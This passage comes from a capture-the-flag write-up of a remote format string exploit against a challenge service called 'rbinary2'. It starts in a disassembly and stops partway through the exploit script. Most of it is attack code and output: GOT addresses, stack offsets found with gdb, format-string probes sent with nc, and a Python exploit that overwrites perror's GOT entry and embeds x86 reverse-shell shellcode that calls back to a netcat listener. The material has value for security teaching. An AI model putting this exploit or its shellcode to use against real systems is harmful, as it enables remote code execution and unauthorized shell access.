   <span class="mh">0x080487c8</span> <span class="o">&lt;+</span><span class="mi">100</span><span class="o">&gt;:</span> <span class="kr">rep</span> <span class="n">stos</span> <span class="n">DWORD</span> <span class="n">PTR</span> <span class="n">es</span><span class="o">:</span><span class="p">[edi],</span><span class="n">eax</span>
   <span class="c">; memset</span>
   <span class="mh">0x080487ca</span> <span class="o">&lt;+</span><span class="mi">102</span><span class="o">&gt;:</span> <span class="k">lea</span>    <span class="n">eax</span><span class="p">,</span><span class="err">[</span><span class="n">ebp</span><span class="o">-</span><span class="mh">0x820</span><span class="err">]</span>
   <span class="mh">0x080487d0</span> <span class="o">&lt;+</span><span class="mi">108</span><span class="o">&gt;:</span> <span class="k">mov</span>    <span class="n">ebx</span><span class="p">,</span><span class="n">eax</span>
   <span class="mh">0x080487d2</span> <span class="o">&lt;+</span><span class="mi">110</span><span class="o">&gt;:</span> <span class="k">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="mh">0x0</span>
   <span class="mh">0x080487d7</span> <span class="o">&lt;+</span><span class="mi">115</span><span class="o">&gt;:</span> <span class="k">mov</span>    <span class="n">edx</span><span class="p">,</span><span class="mh">0x100</span>
   <span class="mh">0x080487dc</span> <span class="o">&lt;+</span><span class="mi">120</span><span class="o">&gt;:</span> <span class="k">mov</span>    <span class="n">edi</span><span class="p">,</span><span class="n">ebx</span>
   <span class="mh">0x080487de</span> <span class="o">&lt;+</span><span class="mi">122</span><span class="o">&gt;:</span> <span class="k">mov</span>    <span class="n">ecx</span><span class="p">,</span><span class="n">edx</span>
   <span class="mh">0x080487e0</span> <span class="o">&lt;+</span><span class="mi">124</span><span class="o">&gt;:</span> <span class="kr">rep</span> <span class="n">stos</span> <span class="n">DWORD</span> <span class="n">PTR</span> <span class="n">es</span><span class="o">:</span><span class="p">[edi],</span><span class="n">eax</span>
<span class="o">&lt;</span><span class="p">...</span><span class="o">&gt;</span>
   <span class="mh">0x0804885e</span> <span class="o">&lt;+</span><span class="mi">250</span><span class="o">&gt;:</span> <span class="k">jmp</span>    <span class="mh">0x8048776</span> <span class="o">&lt;</span><span class="n">recv_loop</span><span class="o">+</span><span class="mi">18</span><span class="o">&gt;</span>
<span class="n">End</span> <span class="n">of</span> <span class="n">assembler</span> <span class="n">dump</span><span class="p">.</span></pre></td></tr></tbody></table></code></pre></figure>

<p>Let’s get GOT addresses!</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
</pre></td><td class="code"><pre>rbinary2@challenge02:~<span class="nv">$ </span>readelf <span class="nt">-r</span> ~/rbinary2

Relocation section <span class="s1">'.rel.dyn'</span> at offset 0x47c contains 2 entries:
 Offset     Info    Type            Sym.Value  Sym. Name
08049ff0  00000806 R_386_GLOB_DAT    00000000   __gmon_start__
0804a058  00001705 R_386_COPY        0804a058   __environ

Relocation section <span class="s1">'.rel.plt'</span> at offset 0x48c contains 20 entries:
 Offset     Info    Type            Sym.Value  Sym. Name
0804a000  00000107 R_386_JUMP_SLOT   00000000   setsockopt
0804a004  00000207 R_386_JUMP_SLOT   00000000   <span class="nb">printf
</span>0804a008  00000307 R_386_JUMP_SLOT   00000000   <span class="nb">wait
</span>0804a00c  00000407 R_386_JUMP_SLOT   00000000   htons
0804a010  00000507 R_386_JUMP_SLOT   00000000   perror
0804a014  00000607 R_386_JUMP_SLOT   00000000   accept
0804a018  00000707 R_386_JUMP_SLOT   00000000   getpid
0804a01c  00000807 R_386_JUMP_SLOT   00000000   __gmon_start__
0804a020  00000907 R_386_JUMP_SLOT   00000000   <span class="nb">exit
</span>0804a024  00000a07 R_386_JUMP_SLOT   00000000   __libc_start_main
0804a028  00000b07 R_386_JUMP_SLOT   00000000   <span class="nb">bind
</span>0804a02c  00000c07 R_386_JUMP_SLOT   00000000   memset
0804a030  00000d07 R_386_JUMP_SLOT   00000000   snprintf
0804a034  00000e07 R_386_JUMP_SLOT   00000000   fork
0804a038  00000f07 R_386_JUMP_SLOT   00000000   htonl
0804a03c  00001007 R_386_JUMP_SLOT   00000000   listen
0804a040  00001107 R_386_JUMP_SLOT   00000000   socket
0804a044  00001207 R_386_JUMP_SLOT   00000000   recv
0804a048  00001307 R_386_JUMP_SLOT   00000000   close
0804a04c  00001407 R_386_JUMP_SLOT   00000000   send</pre></td></tr></tbody></table></code></pre></figure>

<p>From there, we can extract ssock address (remember it is a global variable
from C source code) and perror() GOT address.</p>

<figure class="highlight"><pre><code class="language-text" data-lang="text"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="code"><pre># addresses
perror_got = 0x804a010
ssock_addr = 0x804a064</pre></td></tr></tbody></table></code></pre></figure>

<p>Now onto offsets.</p>

<h3 id="offsets">Offsets</h3>

<p>In order to extract offsets, it would be great to attach gdb to our running
rbinary2. Unfortunately, we have no clue as to what is the pid of our
rbinary2.</p>

<p>Most people will rejoice at the idea that we have the source code and can
recompile it.</p>

<p>It’s the WRONG WAY. Simply because we have absolutely no clues as to what were
the compilation flags used. As such, the compiled binary could be completely
different to the existing rbinary2, neither the code or offsets will be
the same (due to optimizations and other funky compiler features).</p>

<p>The BETTER WAY, would be to use the actual binary, patch the network port on
which to bind and voilà!</p>

<p>We know the original binary bind to port 56006 (0xDAC6), we thus have to search
for \xC6\xDA in the binary (don’t forget that it’s in little endian here) and
change it to whatever port we want it to bind.</p>

<p><img src="ghex" alt="Patching with ghex" />
[ghex]: rbin2-ghex.png</p>

<p>From there, we can actually debug our target and step through it</p>

<p>I didn’t use much the debugger other than for the purpose of getting offsets.
Here how to do it through GDB.</p>

<p>First we look at the ASM code to see where to break.</p>

<p>We are going to break at address 0x0804876f as we will have the correct value of
ESP computed.</p>

<p>We dump part of the stack:</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre></td><td class="code"><pre>gdb ~/rbinary2
gdb<span class="nv">$ </span>x/1000wx <span class="nv">$esp</span>
0xbffff420: 0x00000000 0x00000000 0x00000000 0x00000000
0xbffff430: 0x00000000 0x00000000 0x00000000 0x00000000
&lt;...&gt;
0xbffffc50: 0xb7fd1ff4 0xbfffffe8 0xbffffcb8 0x08048a38
&lt;...&gt;
0xbfffffe0: 0x00000000 0x00000000 0x706d742f 0x2f32722f
0xbffffff0: 0x63746170 0x2e646568 0x006e6962 0x00000000</pre></td></tr></tbody></table></code></pre></figure>

<p>We have to localize where is our format string dumped stack from earlier,
basically, 0x0848a38 is located in our format string stack dump!</p>

<p>Doing some calculation, we can find the start of our stack dump:</p>

<figure class="highlight"><pre><code class="language-text" data-lang="text"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
</pre></td><td class="code"><pre>0xbffffc58 - 523 * 4 = 0xbffff42c = start of format stack</pre></td></tr></tbody></table></code></pre></figure>

<p>We will use 0xbffffcb8 to compute our addresses as in our format string
dump stack, the stack pointer preceding it is not aligned on a 4-bytes boundary.</p>

<p>Now we can have ESP offset:</p>

<figure class="highlight"><pre><code class="language-text" data-lang="text"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
</pre></td><td class="code"><pre>0xbffffcb8 - 0xbffff420 = offset to esp = 0x898 = 2200</pre></td></tr></tbody></table></code></pre></figure>

<p>From there, we can deduce EBP, the input buffer address and the output
buffer address through these formulas:</p>

<figure class="highlight"><pre><code class="language-text" data-lang="text"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td><td class="code"><pre>esp = leaked_addr - 0x898
ebp = esp + 0x838
input_buf = ebp - 0x420
output_buf = ebp - 0x820
landing = input_buf + 100</pre></td></tr></tbody></table></code></pre></figure>

<p>The landing address is arbitrary, we leave 100 bytes for the format string
(but you can adjust it as long as it doesn’t end up after the input_buf bounds.</p>

<p>We got all our offsets and thus can compute all the necessary addresses!</p>

<p>What is left?</p>

<p>Oh right, our format strings for first patching the GOT entry then
the other one for triggering the payload by patching ssock!</p>

<h2 id="advanced-format-strings-techniques">Advanced format strings techniques</h2>

<p>First we need to find the offset (compared to the format string stack pointer)
at which we can find our format string.</p>

<p>For that, we are going to use
<a href="http://crypto.stanford.edu/cs155/papers/formatstring-1.2.pdf">TESO format string techniques</a>
for finding offset using the following pattern:</p>

<figure class="highlight"><pre><code class="language-text" data-lang="text"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
</pre></td><td class="code"><pre>&lt;needle&gt;&lt;stackpop&gt;|%08x&lt;/pre&gt;</pre></td></tr></tbody></table></code></pre></figure>

<p>We change the stackpop after each iteration, after some time we should see
the needle.</p>

<p>Here, ou needle is “AAAABBBBCCCC”.</p>

<p>Let’s try:</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
</pre></td><td class="code"><pre>rbinary2@challenge02:/tmp<span class="nv">$ </span><span class="k">for </span>index <span class="k">in</span> <span class="o">{</span>1..10<span class="o">}</span><span class="p">;</span> <span class="k">do </span><span class="nb">printf</span> <span class="s2">"</span><span class="nv">$index</span><span class="s2">:"</span> <span class="o">&gt;&gt;</span> dump3.raw <span class="o">&amp;&amp;</span> python <span class="nt">-c</span> <span class="s1">'print "A" * 4 + "B" * 4 + "C" * 4 + "%u" * '</span><span class="sb">`</span><span class="nb">echo</span> <span class="nv">$index</span><span class="sb">`</span><span class="s1">' + "|%08x"'</span> | nc 127.0.0.1 56006 <span class="o">&gt;&gt;</span> dump3.raw<span class="p">;</span> <span class="k">done</span></pre></td></tr></tbody></table></code></pre></figure>

<p>We can see this:</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre></td><td class="code"><pre>rbinary2@challenge02:/tmp<span class="nv">$ </span>strings dump3.raw
1:AAAABBBBCCCC0|00000000
2:AAAABBBBCCCC00|00000000
3:AAAABBBBCCCC000|41414141
4:AAAABBBBCCCC0001094795585|42424242
5:AAAABBBBCCCC00010947955851111638594|43434343
6:AAAABBBBCCCC000109479558511116385941128481603|31303030
7:AAAABBBBCCCC000109479558511116385941128481603825241648|37343930
8:AAAABBBBCCCC000109479558511116385941128481603825241648926169392|38353539
9:AAAABBBBCCCC000109479558511116385941128481603825241648926169392943011129|31313135
10:AAAABBBBCCCC000109479558511116385941128481603825241648926169392943011129825307445|38333631</pre></td></tr></tbody></table></code></pre></figure>

<p>So we can infer that after 2 stackpop (%u), we are at the beginning of our
format stack.</p>

<p>Now for our writing format string, here is the pattern used (still from TESO):</p>

<figure class="highlight"><pre><code class="language-text" data-lang="text"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
</pre></td><td class="code"><pre>&lt;padding&gt;&lt;stackpop&gt;&lt;pair of value and address * 2&gt;&lt;write code&gt;</pre></td></tr></tbody></table></code></pre></figure>

<p>We only use 2 pairs as we are going to use short writes (in order to
avoid trashing more bytes than necessary).</p>

<p>After playing around, we end up with the following format strings:</p>

<figure class="highlight"><pre><code class="language-text" data-lang="text"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
</pre></td><td class="code"><pre>got_patch = "A%u%u%u&lt;dummy&gt;&lt;got_addr+2&gt;&lt;dummy&gt;&lt;got_addr&gt;&lt;write1&gt;&lt;write2&gt;"
payload_trigger = "A%u%u%u&lt;dummy&gt;&lt;ssock_addr&gt;&lt;write&gt;&lt;payload&gt;"</pre></td></tr></tbody></table></code></pre></figure>

<p>What is left is for the writes calculation.
Let’s say we want to land on address 0xBFFFF8CC, here how I compute
the 2 lengths:</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre></td><td class="code"><pre><span class="c1"># format elements
</span><span class="n">padding</span> <span class="o">=</span> <span class="s">'A'</span>
<span class="n">stackpop</span> <span class="o">=</span> <span class="s">'</span><span class="si">%</span><span class="s">u</span><span class="si">%</span><span class="s">u</span><span class="si">%</span><span class="s">u'</span>
<span class="n">pairs</span> <span class="o">=</span> <span class="s">'{0}{0}{1}{1}'</span><span class="o">.</span><span class="nb">format</span> <span class="p">(</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span> <span class="p">(</span><span class="s">"&lt;I"</span><span class="p">,</span> <span class="n">perror_got</span> <span class="o">+</span> <span class="mi">2</span><span class="p">),</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span> <span class="p">(</span><span class="s">"&lt;I"</span><span class="p">,</span> <span class="n">perror_got</span><span class="p">)</span> <span class="p">)</span>
<span class="c1"># length calculation for correct address generation
</span><span class="k">print</span> <span class="s">'[+] Calculating lengths'</span>
<span class="n">landing1</span> <span class="o">=</span> <span class="p">((</span><span class="n">landing</span> <span class="o">&amp;</span> <span class="mh">0xffff0000</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">16</span><span class="p">)</span>
<span class="n">len1</span> <span class="o">=</span> <span class="n">landing1</span> <span class="o">-</span> <span class="nb">len</span> <span class="p">(</span><span class="n">padding</span> <span class="o">+</span> <span class="n">stackpop</span> <span class="o">+</span> <span class="n">pairs</span><span class="p">)</span> <span class="o">+</span> <span class="mi">3</span> <span class="c1"># 3 for '%hn'
</span><span class="n">len2</span> <span class="o">=</span> <span class="p">(</span><span class="n">landing</span> <span class="o">&amp;</span> <span class="mh">0xffff</span><span class="p">)</span> <span class="o">-</span> <span class="n">landing1</span></pre></td></tr></tbody></table></code></pre></figure>

<p>Now we have everything we need for a fully reliable remote exploit for
this challenge.</p>

<p>Here it is.</p>

<h2 id="the-exploit">The exploit</h2>

<p>I hardcoded the payload (it is a reverse shell) but you can modify
the exploit as you like.</p>

<p>Just don’t forget to wait with netcat listening:</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
</pre></td><td class="code"><pre>nc <span class="nt">-v</span> <span class="nt">-l</span> <span class="nt">-p</span> <span class="o">[</span>lport]</pre></td></tr></tbody></table></code></pre></figure>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
133
134
135
136
137
138
139
140
141
142
</pre></td><td class="code"><pre><span class="c1">#!/usr/bin/python
</span>
<span class="kn">from</span> <span class="nn">socket</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">import</span> <span class="nn">struct</span>
<span class="kn">import</span> <span class="nn">sys</span>

<span class="c1"># read from binary file
</span><span class="k">def</span> <span class="nf">read_values_from_binfile</span> <span class="p">(</span><span class="n">filename</span><span class="p">):</span>
    <span class="c1"># fill values array
</span>    <span class="n">values</span> <span class="o">=</span> <span class="p">[]</span>
    <span class="k">with</span> <span class="nb">open</span> <span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="s">'rb'</span><span class="p">)</span> <span class="k">as</span> <span class="n">fpr</span><span class="p">:</span>
        <span class="n">content</span> <span class="o">=</span> <span class="n">fpr</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
        <span class="n">span</span> <span class="o">=</span> <span class="mi">4</span>
        <span class="n">values</span> <span class="o">=</span> <span class="p">[</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span> <span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="n">content</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="n">span</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">content</span><span class="p">),</span> <span class="n">span</span><span class="p">)</span> <span class="p">]</span>

    <span class="k">return</span> <span class="n">values</span>

<span class="c1"># leak stack through format string
</span><span class="k">def</span> <span class="nf">leak_addresses</span> <span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">,</span> <span class="n">start</span> <span class="o">=</span> <span class="mi">1</span><span class="p">,</span> <span class="n">end</span> <span class="o">=</span> <span class="mi">746</span><span class="p">):</span>
    <span class="n">values</span> <span class="o">=</span> <span class="p">[]</span>
    <span class="k">for</span> <span class="n">idx</span> <span class="ow">in</span> <span class="nb">range</span> <span class="p">(</span><span class="n">start</span><span class="p">,</span> <span class="n">end</span><span class="p">):</span>
        <span class="n">csock</span> <span class="o">=</span> <span class="n">socket</span> <span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
        <span class="n">csock</span><span class="o">.</span><span class="n">connect</span> <span class="p">(</span> <span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span> <span class="p">)</span>
        <span class="n">fmt</span> <span class="o">=</span> <span class="s">'</span><span class="si">%</span><span class="s">{0}$x'</span><span class="o">.</span><span class="nb">format</span> <span class="p">(</span><span class="n">idx</span><span class="p">)</span>
        <span class="n">csock</span><span class="o">.</span><span class="n">send</span> <span class="p">(</span><span class="n">fmt</span><span class="p">)</span>
        <span class="n">raw</span> <span class="o">=</span> <span class="n">csock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span>
        <span class="c1"># search c string
</span>        <span class="n">value</span> <span class="o">=</span> <span class="s">''</span>
        <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">raw</span><span class="p">:</span>
            <span class="k">if</span> <span class="n">c</span> <span class="o">==</span> <span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">:</span>
                <span class="k">break</span>
            <span class="n">value</span> <span class="o">+=</span> <span class="n">c</span>
        <span class="n">values</span><span class="o">.</span><span class="n">append</span> <span class="p">(</span> <span class="nb">int</span> <span class="p">(</span><span class="n">value</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span> <span class="p">)</span>
        <span class="n">csock</span><span class="o">.</span><span class="n">close</span> <span class="p">()</span>
    <span class="k">return</span> <span class="n">values</span>

<span class="k">def</span> <span class="nf">filter_addr</span> <span class="p">(</span><span class="n">addr_list</span><span class="p">,</span> <span class="n">base_addr</span><span class="p">):</span>
    <span class="n">filtered</span> <span class="o">=</span> <span class="p">[]</span>
    <span class="k">for</span> <span class="n">value</span> <span class="ow">in</span> <span class="n">values</span><span class="p">:</span>
        <span class="k">if</span> <span class="n">value</span> <span class="o">&amp;</span> <span class="mh">0xff000000</span> <span class="o">==</span> <span class="n">base_addr</span><span class="p">:</span>
            <span class="n">filtered</span><span class="o">.</span><span class="n">append</span> <span class="p">(</span><span class="n">value</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">filtered</span>

<span class="k">if</span> <span class="nb">len</span> <span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">==</span> <span class="mi">2</span><span class="p">:</span>
    <span class="p">(</span><span class="n">progname</span><span class="p">,</span> <span class="n">filename</span><span class="p">)</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span>
<span class="k">elif</span> <span class="nb">len</span> <span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">==</span> <span class="mi">4</span><span class="p">:</span>
    <span class="p">(</span><span class="n">progname</span><span class="p">,</span> <span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">,</span> <span class="n">lport</span><span class="p">)</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span>
    <span class="n">port</span> <span class="o">=</span> <span class="nb">int</span> <span class="p">(</span><span class="n">port</span><span class="p">,</span> <span class="mi">10</span><span class="p">)</span>
    <span class="n">lport</span> <span class="o">=</span> <span class="nb">int</span> <span class="p">(</span><span class="n">lport</span><span class="p">,</span> <span class="mi">10</span><span class="p">)</span>
    <span class="n">lport</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span> <span class="p">(</span><span class="s">'&gt;H'</span><span class="p">,</span> <span class="n">lport</span><span class="p">)</span>
    <span class="k">print</span> <span class="s">'lport: {0}'</span><span class="o">.</span><span class="nb">format</span> <span class="p">(</span><span class="n">lport</span><span class="p">)</span>
<span class="k">else</span><span class="p">:</span>
    <span class="k">print</span> <span class="s">'Usage (2 args): {0} dump_name'</span><span class="o">.</span><span class="nb">format</span> <span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
    <span class="k">print</span> <span class="s">'Usage (3 args): {0} host port lport'</span><span class="o">.</span><span class="nb">format</span> <span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
    <span class="nb">exit</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span>

<span class="k">print</span> <span class="s">'[+] Leaking part of stack'</span>
<span class="k">if</span> <span class="s">'filename'</span> <span class="ow">in</span> <span class="nb">locals</span><span class="p">():</span>
    <span class="n">values</span> <span class="o">=</span> <span class="n">read_values_from_binfile</span> <span class="p">(</span><span class="n">filename</span><span class="p">)</span>
<span class="k">elif</span> <span class="s">'host'</span> <span class="ow">in</span> <span class="nb">locals</span><span class="p">()</span> <span class="ow">and</span> <span class="s">'port'</span> <span class="ow">in</span> <span class="nb">locals</span><span class="p">():</span>
    <span class="n">values</span> <span class="o">=</span> <span class="n">leak_addresses</span> <span class="p">(</span> <span class="n">host</span><span class="p">,</span> <span class="n">port</span> <span class="p">)</span>
<span class="k">else</span><span class="p">:</span>
    <span class="k">print</span> <span class="s">'Failed execution'</span>
    <span class="nb">exit</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span>

<span class="c1"># filter out only stack address
</span><span class="n">stack_addr_list</span> <span class="o">=</span> <span class="n">filter_addr</span> <span class="p">(</span><span class="n">values</span><span class="p">,</span> <span class="mh">0xbf000000</span><span class="p">)</span>
<span class="n">libs</span> <span class="o">=</span> <span class="n">filter_addr</span> <span class="p">(</span><span class="n">values</span><span class="p">,</span> <span class="mh">0xb7000000</span><span class="p">)</span>
<span class="s">'''
dirty hack to get stack address
better: align values to array of offsets and determine correct stack address
'''</span>
<span class="n">leaked_addr</span> <span class="o">=</span> <span class="n">values</span><span class="p">[</span><span class="mi">523</span><span class="p">]</span>
<span class="k">print</span> <span class="s">'[+] Got leaked address'</span>

<span class="c1"># compute buffer addresses
</span><span class="k">print</span> <span class="s">'[+] Computing addresses'</span>
<span class="n">esp</span> <span class="o">=</span> <span class="n">leaked_addr</span> <span class="o">-</span> <span class="mh">0x898</span>
<span class="n">ebp</span> <span class="o">=</span> <span class="n">esp</span> <span class="o">+</span> <span class="mh">0x838</span>
<span class="n">input_buf</span> <span class="o">=</span> <span class="n">ebp</span> <span class="o">-</span> <span class="mh">0x420</span>
<span class="n">output_buf</span> <span class="o">=</span> <span class="n">ebp</span> <span class="o">-</span> <span class="mh">0x820</span>
<span class="n">landing</span> <span class="o">=</span> <span class="n">input_buf</span> <span class="o">+</span> <span class="mi">100</span>
<span class="k">print</span> <span class="s">'    esp    : 0x{0:x}'</span><span class="o">.</span><span class="nb">format</span> <span class="p">(</span><span class="n">esp</span><span class="p">)</span>
<span class="k">print</span> <span class="s">'    ebp    : 0x{0:x}'</span><span class="o">.</span><span class="nb">format</span> <span class="p">(</span><span class="n">ebp</span><span class="p">)</span>
<span class="k">print</span> <span class="s">'    input  : 0x{0:x}'</span><span class="o">.</span><span class="nb">format</span> <span class="p">(</span><span class="n">input_buf</span><span class="p">)</span>
<span class="k">print</span> <span class="s">'    output : 0x{0:x}'</span><span class="o">.</span><span class="nb">format</span> <span class="p">(</span><span class="n">output_buf</span><span class="p">)</span>
<span class="k">print</span> <span class="s">'    landing: 0x{0:x}'</span><span class="o">.</span><span class="nb">format</span> <span class="p">(</span><span class="n">landing</span><span class="p">)</span>

<span class="c1"># addresses
</span><span class="n">perror_got</span> <span class="o">=</span> <span class="mh">0x804a010</span>
<span class="n">ssock_addr</span> <span class="o">=</span> <span class="mh">0x804a064</span>

<span class="c1"># format elements
</span><span class="n">padding</span> <span class="o">=</span> <span class="s">'A'</span>
<span class="n">stackpop</span> <span class="o">=</span> <span class="s">'</span><span class="si">%</span><span class="s">u</span><span class="si">%</span><span class="s">u</span><span class="si">%</span><span class="s">u'</span>
<span class="n">pairs</span> <span class="o">=</span> <span class="s">'{0}{0}{1}{1}'</span><span class="o">.</span><span class="nb">format</span> <span class="p">(</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span> <span class="p">(</span><span class="s">"&lt;I"</span><span class="p">,</span> <span class="n">perror_got</span> <span class="o">+</span> <span class="mi">2</span><span class="p">),</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span> <span class="p">(</span><span class="s">"&lt;I"</span><span class="p">,</span> <span class="n">perror_got</span><span class="p">)</span> <span class="p">)</span>
<span class="c1"># length calculation for correct address generation
</span><span class="k">print</span> <span class="s">'[+] Calculating lengths'</span>
<span class="n">landing1</span> <span class="o">=</span> <span class="p">((</span><span class="n">landing</span> <span class="o">&amp;</span> <span class="mh">0xffff0000</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">16</span><span class="p">)</span>
<span class="n">len1</span> <span class="o">=</span> <span class="n">landing1</span> <span class="o">-</span> <span class="nb">len</span> <span class="p">(</span><span class="n">padding</span> <span class="o">+</span> <span class="n">stackpop</span> <span class="o">+</span> <span class="n">pairs</span><span class="p">)</span> <span class="o">+</span> <span class="mi">3</span> <span class="c1"># 3 for '%hn'
</span><span class="n">len2</span> <span class="o">=</span> <span class="p">(</span><span class="n">landing</span> <span class="o">&amp;</span> <span class="mh">0xffff</span><span class="p">)</span> <span class="o">-</span> <span class="n">landing1</span>

<span class="c1"># construct format strings
</span><span class="k">print</span> <span class="s">'[+] Building perror_got patch format string'</span>
<span class="n">fmt_write_got</span> <span class="o">=</span> <span class="n">padding</span> <span class="o">+</span> <span class="n">stackpop</span> <span class="o">+</span> <span class="n">pairs</span> <span class="o">+</span> <span class="s">'</span><span class="si">%</span><span class="s">{0}u</span><span class="si">%</span><span class="s">hn'</span><span class="o">.</span><span class="nb">format</span> <span class="p">(</span><span class="n">len1</span><span class="p">)</span> <span class="o">+</span> <span class="s">'</span><span class="si">%</span><span class="s">{0}u</span><span class="si">%</span><span class="s">hn'</span><span class="o">.</span><span class="nb">format</span> <span class="p">(</span><span class="n">len2</span><span class="p">)</span>
<span class="k">print</span> <span class="s">'    {0}'</span><span class="o">.</span><span class="nb">format</span> <span class="p">(</span><span class="n">fmt_write_got</span><span class="p">)</span>

<span class="c1"># reverse shell to port 11111
</span><span class="k">print</span> <span class="s">'[+] Building ssock patch format string'</span>
<span class="n">payload</span> <span class="o">=</span> <span class="s">"</span><span class="se">\x31\xdb\xf7\xe3\xb0\x66\x43\x52\x53\x6a</span><span class="s">"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x02\x89\xe1\xcd\x80\x59\x93\xb0\x3f\xcd</span><span class="s">"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x80\x49\x79\xf9\xb0\x66\x68\x7f\x01\x01</span><span class="s">"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x01\x66\x68</span><span class="s">"</span> <span class="o">+</span> <span class="n">lport</span> <span class="o">+</span> <span class="s">"</span><span class="se">\x66\x6a\x02\x89\xe1</span><span class="s">"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x6a\x10\x51\x53\x89\xe1\xcd\x80\xb0\x0b</span><span class="s">"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69</span><span class="s">"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x6e\x89\xe3\x31\xc9\xcd\x80</span><span class="s">"</span>
<span class="k">print</span> <span class="s">'[+] payload = {0}'</span><span class="o">.</span><span class="nb">format</span> <span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="n">fmt_write_ssock</span> <span class="o">=</span> <span class="n">padding</span> <span class="o">+</span> <span class="n">stackpop</span> <span class="o">+</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span> <span class="p">(</span><span class="s">"&lt;I"</span><span class="p">,</span> <span class="n">ssock_addr</span><span class="p">)</span> <span class="o">*</span> <span class="mi">2</span> <span class="o">+</span> <span class="s">'</span><span class="si">%10</span><span class="s">u</span><span class="si">%</span><span class="s">hn'</span>
<span class="c1"># too much nopsled cause the payload to be cutted off, need to calculate better
# nopsled = (1023 - len (fmt_write_ssock)) * '\x90'
